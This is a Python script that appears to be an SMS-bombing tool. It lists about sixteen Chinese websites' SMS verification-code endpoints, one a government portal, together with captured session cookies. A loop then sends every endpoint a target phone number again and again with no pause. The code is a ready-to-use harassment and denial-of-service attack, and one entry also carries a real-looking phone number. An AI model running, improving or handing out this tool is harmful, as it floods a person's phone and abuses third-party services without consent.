# -*- coding: utf-8 -*-
# Author: Howard Hu

import json
import requests
import time

# Some APIs are expired.
APIS = [
	{
		"url": "https://www.yojiang.cn/api/user/send_verify_code?phone=target_Phone",
		"type": "GET",
		"cookie": "guest_uuid=5e3626fd9b6dde14e9293bee; _xsrf=2|a63a71a2|6bfa82e8f3ff66bbf83b67c2a67a9cf5|1580823294; Hm_lvt_91f2894c14ed1eb5a6016e859758fb9c=1580825404; Hm_lpvt_91f2894c14ed1eb5a6016e859758fb9c=1580825404"
	},
	{
		"url": "https://m.health.pingan.com/mapi/smsCode.json?deviceId=5a4c935cbb6ff6ca&deviceType=SM-G9300&timestamp=1545122608&app=0&platform=3&app_key=PAHealth&osversion=23&info=&version=1.0.1&resolution=1440x2560&screenSize=22&netType=1&channel=m_h5&phone=target_Phone",
		"type": "GET"
	},
	{
		"url": "https://www.smartstudy.com/api/user-service/captcha/phone",
		"body": {
			"type": "authenticode",
			"phone": "target_Phone",
			"countryCode": "86",
		},
		"type": "POST"
	},
	{
		"url": "https://exmail.qq.com/cgi-bin/bizmail_portal?action=send_sms&type=11&t=biz_rf_portal_mgr&ef=jsnew&resp_charset=UTF8&area=86&mobile=target_Phone",
		"type": "GET",
	},
	{
		"url": "https://id.kuaishou.com/pass/kuaishou/sms/requestMobileCode",
		"type": "POST",
		"body": {
			"sid": "kuaishou.live.web",
			"type": "53",
			"countryCode": "+86",
			"phone": "target_Phone"
		}
	},
	{
		"url": "http://jrh.financeun.com/Login/sendMessageCode3.html?mobile=target_Phone&mbid=197873&check=3",
		"type": "GET",
		"cookie": "PHPSESSID=q8h78o91qm30m5bl7lufkt3go3; jrh_visit_log=q8h78o91qm30m5bl7lufkt3go3; Hm_lvt_b627bb080fd97f01181b26820034cfcb=1580999339; UM_distinctid=1701ae772688ac-09ae1bde44e676-6701b35-144000-1701ae772699ca; CNZZDATA1276814029=219078261-1580999135-%7C1580999135; Hm_lpvt_b627bb080fd97f01181b26820034cfcb=1580999403"
	},
	{
		"url": "https://developer.i4.cn/put/getMsgCode.xhtml?_=1580912157461&phoneNumber=target_Phone&codeType=6",
		"type": "GET"
	},
	{
		"special": "xxsy",
		"first": {
			"url": "https://www.xxsy.net/Reg",
			"type": "GET"
		},
		"url": "https://www.xxsy.net/Reg/Actions",
		"type": "POST",
		"body": {
			"method": "sms",
			"mobile": "target_Phone",
			"uname": "target_Phone",
			"token": "",
		},
		"headers": {
			"cookie": "ASP.NET_SessionId=1zpetajacprst1vvgvtqvt2u; pcstatpageusersign=1lzva83zoqa3qpid3ukvojnye9xgq0th; UM_distinctid=1701a43b89b44b-0e920e8853ac59-6701b35-144000-1701a43b89c9d1; CNZZDATA1275068799=1423156539-1580988611-https%253A%252F%252Fwww.hao123.com%252F%7C1580988611; CNZZDATA1275068004=1203802890-1580988611-https%253A%252F%252Fwww.hao123.com%252F%7C1580988611; __qc_wId=999; pgv_pvid=1596346520; xxcpoint=GU3TIZJYHE3DOZJTGAZTKOJUGJSGIOJWG5SWCMDDGA4DANJZGJRA",
			'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.88 Safari/537.36',
			"X-Requested-With": "XMLHttpRequest"
		}
	},
	{
		"special": "ruanmei",
		"first": {
			"url": "https://my.ruanmei.com/?page=register",
			"type": "GET"
		},
		"headers": {
			"cookie": "ASP.NET_SessionId=wmw5kiwrmvxibb2zvk2qhxsh; CheckCode=MXPF; CheckCode_fp=GNGW; KLBRSID=b039105d4718660de1867d1c40076e29|1580992153|1580992141; sendsms=Thu%20Feb%2006%202020%2020%3A29%3A13%20GMT+0800%20%28%u4E2D%u56FD%u6807%u51C6%u65F6%u95F4%29",
			'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.88 Safari/537.36',
			"Referer": "https://my.ruanmei.com/?page=register",
			"X-Requested-With": "XMLHttpRequest",
			"Content-Type": "application/json; charset=UTF-8"
		},
		"url": "https://my.ruanmei.com/Default.aspx/SendSmsReg20190319",
		"type": "POST",
		"body": {
			"mobile": "target_Phone",
			"checkreg": "true",
			"validate": "",
			"data": ""
		}
	},
	{
		"url": "http://qydj.scjg.tj.gov.cn/reportOnlineService/login_login",
		"type": "POST",
		"body": {
			"MOBILENO": "target_Phone",
			"TEMP": "1"
		},
		"cookie": "qcdzh-session-id=fe77ec80-efb8-4238-844e-c0e136b349de; UM_distinctid=1701adce0071-069b6727280a07-6701b35-144000-1701adce00891c; CNZZDATA1274944014=862482110-1580998603-http%253A%252F%252Fqydj.scjg.tj.gov.cn%252F%7C1580998603"
	},

	# daiwoqu
	{
		'url': 'https://accounts.daiwoqu.com/api',
		'body': {
			'type': 'login_yzm', 'phone': 'target_Phone', 'kind': 'login_yzm',
		}
	},
	# weibo zhidao
	{
		'url': 'https://iask.sina.com.cn/cas-api/sendSms',
		'body': {
			'businessCode': '4', 'nationCode': '86', 'mobile': 'target_Phone', 'terminal': 'pc', 'businessSys': 'iask',
		}
	},
	# smartstudy
	{
		"url": "https://www.smartstudy.com/api/user-service/captcha/phone",
		"body": {
			"type": "authenticode",
			"phone": "target_Phone",
			"countryCode": "86",
		}
	},
	# yojiang
	{
		"url": "https://www.yojiang.cn/api/user/send_verify_code?phone=target_Phone",

		"cookie": "guest_uuid=5e3626fd9b6dde14e9293bee; _xsrf=2|a63a71a2|6bfa82e8f3ff66bbf83b67c2a67a9cf5|1580823294; Hm_lvt_91f2894c14ed1eb5a6016e859758fb9c=1580825404; Hm_lpvt_91f2894c14ed1eb5a6016e859758fb9c=1580825404"
	},
	# yuanfudao
	{
		"url": "https://ke.yuanfudao.com/tutor-ytk-account/verifier/api/sms?_productId=374&_hostProductId=374&platform=www&version=5.11.0&UDID=227aecf976ffd627d1f266df4a204520&timestamp=1616570171713",
		"body": {
			"phone": "ynCE+bzmVpzko1PahGxfXaye9U8Y9Nl8twN9QBjGJFLoYUZvYmetRP4d8hCunvQFTBR8RY8LE+0k9hMm/TzytHmnVe8g3oZgHYfWu3qEjC07SotQmZAzd3c2cu/XGzh8ou0ALYEWjmy7lkmHadxvAwMGSwPrhBHxGbN+qg0Hl9Y=",
		}

	},
	# laike
	{
		"url": "http://jk.like2100.com/rms/sys/execute",
		"body": {
			'service': 'sysCode', 'method': 'putCode',
			'params': "{'phone':'18858276806','type':'sendRegistered','sign':'641679332A5AED0928883FFC03259AD8'}",
		}
	}

]


def sendSMS(API, phone):
	headers = {
		'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.86 Safari/537.36',
	}
	if API.get('headers'):
		headers.update(API.get('headers'))

	url = API.get('url').replace("target_Phone", phone).replace("time1", str(int(time.time()))).replace("time2", str(
		int(time.time())))
	body = API.get('body')
	cookies = API.get('cookie')
	headers = API.get('headers')
	try:
		if body:
			body = eval(str(body).replace("target_Phone", phone)) if isinstance(body, dict) else body.replace(
				"target_Phone", phone)
			r = requests.post(url, body, headers=headers)
		elif cookies:
			temp_headers = {
				'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.86 Safari/537.36',
				'cookie': str(cookies)}
			r = requests.get(url, headers=temp_headers)
		elif headers and body:
			temp_headers = headers
			body = eval(str(body).replace("target_Phone", phone)) if isinstance(body, dict) else body.replace(
				"target_Phone", phone)
			r = requests.post(url, body, headers=temp_headers)
		else:
			r = requests.get(url, headers=headers)
		# print(r.status_code)
		# print(r.text)
		# print(json.loads(r.text))
	except:
		...


if __name__ == '__main__':

	# put the target phone number here
	phone = ""
	i = 1
	while (True):
		for API in APIS:
			sendSMS(API, phone)
		print(f"{time.strftime('%Y-%m-%d %H:%M:%S', time.localtime())} This is the {i}th try")
		i = i + 1
		time.sleep(0)
